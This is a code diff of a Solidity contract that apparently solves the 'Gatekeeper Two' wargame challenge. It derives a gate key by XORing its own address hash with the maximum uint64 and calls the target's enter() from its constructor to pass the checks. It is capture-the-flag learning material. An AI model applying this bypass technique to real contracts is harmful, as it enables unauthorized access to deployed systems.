@@ -5,12 +5,14 @@ interface GatekeeperTwo {
     function enter(bytes8 _gateKey) external returns (bool);
 }
 
-contract PassdGatekeeperTwo {
-    address gatekeeperAddress = 0xd7cD0E57136446C7bc53bE1dFEa6208BD8274483;
+contract PassGatekeeperTwo {
+    address gatekeeperAddress = 0x1d9dDac6c231F7EF1D7fd4a46b55fd3589152aee;
+    GatekeeperTwo gatekeeperContract = GatekeeperTwo(gatekeeperAddress);
 
-    uint64 contractHash = uint64(bytes8(keccak256(abi.encodePacked(this))));
-    uint64 key = contractHash ^ type(uint64).max;
-    bytes8 gateKey = bytes8(key);
+    uint64 hash = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
+    uint64 max = type(uint64).max;
+    uint64 key = max ^ hash;
+    bytes8 _gateKey = bytes8(key);
 
     // a ^ a ^ b = b
     // et
@@ -24,7 +26,6 @@ contract PassdGatekeeperTwo {
     // key = hash ^ max
 
     constructor() {
-        GatekeeperTwo targetContract = GatekeeperTwo(gatekeeperAddress);
-        require(targetContract.enter(gateKey), "failed");
+        require(gatekeeperContract.enter(_gateKey), "failed");
     }
 }
